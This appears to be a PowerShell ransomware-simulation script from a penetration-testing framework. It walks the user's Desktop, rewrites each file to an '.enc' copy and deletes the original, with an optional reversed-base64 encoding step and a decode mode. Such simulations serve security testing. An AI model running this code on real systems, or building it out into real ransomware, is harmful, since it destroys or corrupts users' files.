function enc($F) {
    $data = GET-Content $F
    # rev(base64e($data)) | Out-File -FilePath $F".enc"
    $data | Out-File -FilePath $F".enc"
    Remove-Item -path $F
}


function dec($F) {
    $data = GET-Content $F
    # base64d(rev($data)) | Out-File -FilePath $F.replace(".enc", "")
    $data | Out-File -FilePath $F.replace(".enc", "")
    Remove-Item -path $F
}


function base64e($DATA) {
    # https://adsecurity.org/?p=478
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($DATA)
    $EncodedText =[Convert]::ToBase64String($Bytes)
    return $EncodedText
}


function base64d($DATA) {
    # https://adsecurity.org/?p=478
    $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($DATA))
    return $DecodedText
}


function rev($DATA) {
    # https://github.com/exercism/powershell/blob/master/exercises/reverse-string/ReverseString.example.ps1
    $reversed = ""
    for($i = $DATA.Length; $i -gt 0; $i--){
        $reversed += $DATA[$i - 1]
    }
    return $reversed
}


function Invoke-Shennina-Ransomware-Simulation() {
    $MODE = "enc"
    $DIR = $HOME + "\Desktop"
    $FILES=(Get-ChildItem -Path $DIR -Name -Recurse -include *.* )
    $FILES = $FILES -split [System.Environment]::NewLine

    for ($i=0; $i -lt $FILES.length; $i++) {
        $FULLNAME = $DIR + "\" + $FILES[$i]
        Write-Output $FULLNAME
        if ($MODE -eq "enc") {
            enc($FULLNAME)
        } elseif ($MODE -eq "dec") {
            dec($FULLNAME)
        }
    }
}
